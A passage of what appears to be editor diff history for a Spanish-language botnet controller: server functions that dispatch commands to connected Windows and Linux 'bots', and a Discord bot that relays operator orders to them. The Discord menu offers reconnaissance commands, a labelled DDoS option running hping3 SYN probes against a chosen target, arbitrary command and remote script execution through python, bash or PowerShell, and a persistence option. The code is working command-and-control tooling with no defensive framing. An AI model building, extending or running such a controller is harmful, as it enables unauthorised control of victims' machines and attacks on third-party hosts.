id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opción no válida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[→] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un bot específico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y envía el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexión del bot si ocurre durante la comunicación.\r\n+\r\n+    :param bot: El socket del bot al que se enviará el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots(bot_id):\r\n+    \"\"\"\r\n+    Cierra la conexión con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n+    los bots conectados.\r\n+    \r\n+    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n+    :type bot_id: int\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot:  # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close()  # Cerrar la conexión\r\n+            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot)  # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot]  # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot]  # Eliminar el SO del bot\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+\r\n+def listar_bots():\r\n+    \"\"\"\r\n+    Lista los bots conectados al servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        if bots:\r\n+            print(\"\\nBots conectados:\\n\")\r\n+            for bot_conn in bots:\r\n+                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n+                print(f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\")\r\n+        else:\r\n+            print(\"No hay bots conectados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740255100821,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,285 @@\n+import discord\r\n+from discord.ext import commands\r\n+import logging\r\n+import configparser\r\n+import os\r\n+import requests\r\n+\r\n+# Cargar configuración\r\n+config = configparser.ConfigParser()\r\n+config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n+\r\n+intents = discord.Intents.default()\r\n+intents.message_content = True\r\n+bot = commands.Bot(command_prefix='!', intents=intents)\r\n+\r\n+# Variables globales\r\n+API_URL = \"http://127.0.0.1:5000\"  # URL de la API del servidor\r\n+\r\n+@bot.event\r\n+async def on_ready():\r\n+    logging.info(f'Bot conectado como {bot.user}')\r\n+    print(f'Bot conectado como {bot.user}')\r\n+\r\n+@bot.command(name='listar_bots')\r\n+async def listar_bots_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para listar los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        response = requests.get(f\"{API_URL}/listar_bots\")\r\n+        if response.status_code == 200:\r\n+            bots_info = response.json()\r\n+            if \"message\" in bots_info:\r\n+                await ctx.send(bots_info[\"message\"])\r\n+            else:\r\n+                response_text = \"\\nBots conectados:\\n\"\r\n+                for bot_info in bots_info:\r\n+                    response_text += f\"Bot {bot_info['id']} ({bot_info['so']}): {bot_info['direccion']}\\n\"\r\n+                await ctx.send(response_text)\r\n+        else:\r\n+            await ctx.send(\"Error al listar bots.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+        await ctx.send(\"Error al listar bots.\")\r\n+\r\n+@bot.command(name='enviar_comando')\r\n+async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n+    \"\"\"\r\n+    Comando de Discord para enviar un comando a los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        data = {\r\n+            \"comando_windows\": comando_windows,\r\n+            \"comando_linux\": comando_linux,\r\n+            \"seleccion\": \"1\"  # Enviar a todos los bots\r\n+        }\r\n+        response = requests.post(f\"{API_URL}/enviar_comando\", json=data)\r\n+        if response.status_code == 200:\r\n+            await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n+        else:\r\n+            await ctx.send(\"Error al enviar comando.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+        await ctx.send(\"Error al enviar comando.\")\r\n+\r\n+@bot.command(name='cerrar_conexion')\r\n+async def cerrar_conexion_command(ctx, bot_id: int):\r\n+    \"\"\"\r\n+    Comando de Discord para cerrar la conexión con un bot específico.\r\n+    \"\"\"\r\n+    try:\r\n+        data = {\"bot_id\": bot_id}\r\n+        response = requests.post(f\"{API_URL}/cerrar_conexion\", json=data)\r\n+        if response.status_code == 200:\r\n+            await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n+        else:\r\n+            await ctx.send(\"Error al cerrar conexión.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n+\r\n+@bot.command(name='menu_comandos')\r\n+async def menu_comandos_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar el menú de comandos.\r\n+    \"\"\"\r\n+    try:\r\n+        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n+        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+        tipo_comando = tipo_comando.content.strip()\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n+                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                objetivo = objetivo.content.strip()\r\n+                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n+                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                puerto = puerto.content.strip()\r\n+                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n+                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                protocolo = protocolo.content.strip().upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    await ctx.send(\"Protocolo no válido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n+                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_windows = comando_windows.content.strip()\r\n+                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n+                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico.\r\n+    - Ejemplo: `!cerrar_conexion 1`\r\n+\r\n+    **!menu_comandos**\r\n+    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n+\r\n+    **!ayuda**\r\n+    - Muestra este mensaje de ayuda.\r\n+    \"\"\"\r\n+    await ctx.send(help_text)\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        data = {\r\n+            \"comando_windows\": comando_windows,\r\n+            \"comando_linux\": comando_linux,\r\n+            \"tipo_comando\": tipo_comando,\r\n+            \"seleccion\": \"1\"  # Enviar a todos los bots\r\n+        }\r\n+        response = requests.post(f\"{API_URL}/enviar_comando\", json=data)\r\n+        if response.status_code == 200:\r\n+            print(\"Comando enviado a los bots seleccionados.\")\r\n+        else:\r\n+            print(\"Error al enviar comando.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+bot.run(config.get(\"DISCORD\", \"BOT_TOKEN\"))\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740255677235,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -15,8 +15,18 @@\n \r\n # Variables globales\r\n API_URL = \"http://127.0.0.1:5000\"  # URL de la API del servidor\r\n \r\n+# Configurar logging\r\n+logging.basicConfig(\r\n+    level=logging.INFO,\r\n+    format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+    handlers=[\r\n+        logging.FileHandler(os.path.join(os.path.dirname(__file__), \"..\", \"logs\", \"discord_bot.log\"), encoding=\"utf-8\"),\r\n+        logging.StreamHandler()\r\n+    ]\r\n+)\r\n+\r\n @bot.event\r\n async def on_ready():\r\n     logging.info(f'Bot conectado como {bot.user}')\r\n     print(f'Bot conectado como {bot.user}')\r\n@@ -281,1920 +291,5 @@\n             print(\"Error al enviar comando.\")\r\n     except Exception as e:\r\n         logging.error(f\"Error al enviar comando: {e}\")\r\n \r\n-bot.run(config.get(\"DISCORD\", \"BOT_TOKEN\"))\n-import discord\r\n-from discord.ext import commands\r\n-import logging\r\n-import configparser\r\n-import os\r\n-import socket\r\n-import subprocess\r\n-import threading\r\n-import time\r\n-\r\n-# Cargar configuración\r\n-config = configparser.ConfigParser()\r\n-config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n-\r\n-intents = discord.Intents.default()\r\n-intents.message_content = True\r\n-bot = commands.Bot(command_prefix='!', intents=intents)\r\n-\r\n-# Variables globales\r\n-bots = []  # Lista de bots conectados\r\n-bot_ids = {}  # Diccionario con los IDs de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n-\r\n-@bot.event\r\n-async def on_ready():\r\n-    logging.info(f'Bot conectado como {bot.user}')\r\n-    print(f'Bot conectado como {bot.user}')\r\n-\r\n-@bot.command(name='listar_bots')\r\n-async def listar_bots_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para listar los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            response = \"\\nBots conectados:\\n\"\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n-        else:\r\n-            response = \"No hay bots conectados.\"\r\n-        await ctx.send(response)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-        await ctx.send(\"Error al listar bots.\")\r\n-\r\n-@bot.command(name='enviar_comando')\r\n-async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n-    \"\"\"\r\n-    Comando de Discord para enviar un comando a los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        enviar_comando(comando_windows, comando_linux)\r\n-        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-        await ctx.send(\"Error al enviar comando.\")\r\n-\r\n-@bot.command(name='cerrar_conexion')\r\n-async def cerrar_conexion_command(ctx, bot_id: int):\r\n-    \"\"\"\r\n-    Comando de Discord para cerrar la conexión con un bot específico.\r\n-    \"\"\"\r\n-    try:\r\n-        cerrar_conexion_bots(bot_id)\r\n-        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n-\r\n-@bot.command(name='menu_comandos')\r\n-async def menu_comandos_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar el menú de comandos.\r\n-    \"\"\"\r\n-    try:\r\n-        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n-        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-        tipo_comando = tipo_comando.content.strip()\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n-                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                objetivo = objetivo.content.strip()\r\n-                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n-                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                puerto = puerto.content.strip()\r\n-                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n-                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                protocolo = protocolo.content.strip().upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    await ctx.send(\"Protocolo no válido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n-                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_windows = comando_windows.content.strip()\r\n-                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n-                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_linux = comando_linux.content.strip()\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n-                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                tipo = tipo.content.strip()\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n-                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    extension = extension.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n-                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_linux = interprete_linux.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n-                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_windows = interprete_windows.content.strip()\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n-                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                metodo = metodo.content.strip()\r\n-\r\n-                if metodo == \"1\":\r\n-                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                        linea = linea.content.strip()\r\n-                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n-                            break\r\n-                        lineas.append(linea)\r\n-                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n-                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    ruta = ruta.content.strip()\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-        else:\r\n-            await ctx.send(\"Opción no válida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el menú de comandos: {e}\")\r\n-        await ctx.send(\"Error en el menú de comandos.\")\r\n-\r\n-@bot.command(name='ayuda')\r\n-async def ayuda_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar la ayuda del bot.\r\n-    \"\"\"\r\n-    help_text = \"\"\"\r\n-    **Comandos disponibles:**\r\n-\r\n-    **!listar_bots**\r\n-    - Lista los bots conectados al servidor.\r\n-\r\n-    **!enviar_comando <comando_windows> <comando_linux>**\r\n-    - Envía un comando a los bots conectados.\r\n-    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n-\r\n-    **!cerrar_conexion <bot_id>**\r\n-    - Cierra la conexión con un 